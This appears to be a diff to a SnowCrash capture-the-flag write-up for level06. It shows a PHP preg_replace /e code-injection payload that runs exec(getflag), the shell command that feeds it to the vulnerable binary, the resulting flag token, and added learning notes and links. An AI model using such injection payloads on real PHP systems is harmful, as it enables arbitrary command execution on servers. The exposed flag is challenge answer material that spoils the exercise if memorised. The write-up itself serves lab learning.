@@ -39,7 +39,7 @@ PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level0
 [x {${exec(getflag)}}]
 # "This gives the attacker the ability to execute arbitrary PHP code and as such gives them nearly complete access to your server."
 #	Using this `{${exec(...)}}` will execute any given command as the shell own by the user who own the script here 
-#		(Which is flag06, What we want)
+#		(Which is level06 has the correct user rights to run getflag command)
 
 echo '[x {${exec(getflag)}}]' > /tmp/Gabe; ./level06 /tmp/Gabe
 
@@ -49,8 +49,13 @@ level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/Gabe; ./level06 /tmp/G
 PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
 
+# What we learnt
+#	We used a code injection attack.
 
 Resources
 http://php.net/manual/en/reference.pcre.pattern.modifiers.php
 https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
 http://www.madirish.net/402
+https://www.usna.edu/Users/cs/aviv/classes/ic221/s16/lec/24/lec.html
+http://php.net/manual/en/function.exec.php
+https://stackoverflow.com/questions/3115559/exploitable-php-functions
